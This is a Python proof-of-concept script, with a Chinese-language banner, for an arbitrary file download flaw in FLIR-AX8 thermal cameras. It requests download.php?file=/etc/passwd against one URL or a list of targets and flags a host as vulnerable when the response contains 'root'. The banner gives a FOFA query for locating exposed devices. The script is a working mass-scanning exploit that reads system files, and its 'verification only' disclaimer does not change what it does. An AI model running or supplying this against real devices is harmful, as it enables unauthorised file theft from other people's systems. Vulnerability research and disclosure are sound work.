#!/usr/bin/python
#coding=GBK
import  requests
from argparse import ArgumentParser
def info(title,fofa):
    print("-------------------------------------------------")
    print("FIRL-AXR 任意文件下载POC|                          |")
    print("适用版本: FLIR-AX8                                |")
    print("author:木鱼                                      |")
    print("该脚本仅用于验证漏洞存在，不可用于任何违法用途！          |")
    print("  FOFA:app='FLIR-FLIR-AX8'                       |")
    print("-------------------------------------------------")
def poc(url,payload="/etc/passwd"):
    path ="/download.php?file={}".format(payload)
    urls  = url + path
    try:
        resp = requests.get(urls, verify=False)
        if 'root' in resp.text:
            print(url + "存在任意文件下载漏洞")
        else:
            print(url + "不存在任意文件下载漏洞")

    except BaseException as e :
        pass



if __name__ == '__main__':
    group =ArgumentParser()
    group.add_argument('-u','--url',type=str,help="input url")
    group.add_argument('-f','--File',type=str,help="input file")
    args = group.parse_args()
    if args.url:
        url = args.url
        poc(url)
    elif args.File:
        filename = args.File
        print(filename)
        with open(filename,'r')as e:
            files = e.readlines()
            for file in files:
                if not (file.startswith("http") or file.startswith("https")):
                    file = "http://"+file
                    poc(file.strip())
                else:
                    poc(file)

